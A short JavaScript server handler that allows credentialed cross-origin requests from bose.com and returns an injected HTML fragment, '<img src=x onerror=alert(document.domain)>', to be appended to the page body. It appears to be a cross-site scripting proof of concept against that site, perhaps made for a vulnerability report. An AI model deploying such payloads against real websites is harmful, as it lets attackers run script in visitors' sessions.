export default function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', 'https://www.bose.com');
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  res.setHeader('Access-Control-Allow-Methods', 'GET, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    return res.status(204).end();
  }

  res.status(200).json([
    {
      placement: { anchor: 'body', mode: 'append' },
      html: '<img src=x onerror=alert(document.domain)>',
    },
  ]);
}
